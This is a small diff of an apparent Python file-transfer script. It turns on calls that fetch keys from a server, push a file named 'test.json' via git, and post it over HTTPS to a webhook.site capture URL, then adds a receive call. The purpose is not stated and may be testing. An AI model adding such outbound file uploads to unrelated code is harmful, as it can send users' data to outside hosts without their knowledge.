@@ -85,6 +85,7 @@ def recv(remote_url):
 
 if __name__=="__main__":
 	fetch_keys(SERVER)
-	#send_git_file("test.json")
-	#send_https_file("test.json","https://webhook.site/ff3193e4-77b4-42c7-8787-afb64168e494")	
+	send_git_file("test.json")
+	send_https_file("test.json","https://webhook.site/ff3193e4-77b4-42c7-8787-afb64168e494")	
 	send_commit_message("Test")
+	recv(None)
